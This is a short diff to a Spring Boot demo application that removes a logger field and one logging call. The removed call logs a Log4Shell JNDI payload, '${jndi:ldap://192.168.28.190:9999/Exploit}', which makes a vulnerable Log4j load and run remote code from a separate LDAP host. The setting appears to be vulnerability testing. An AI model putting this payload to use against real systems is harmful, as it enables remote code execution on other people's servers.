@@ -8,10 +8,9 @@ import sun.applet.Main;
 
 @SpringBootApplication
 public class Demo1Application {
-    private static Logger LOG =LogManager.getLogger(Demo1Application.class);
+
     public static void main(String[] args) {
 
-        LOG.error("${jndi:ldap://192.168.28.190:9999/Exploit}");
 
         SpringApplication.run(Demo1Application.class, args);
     }
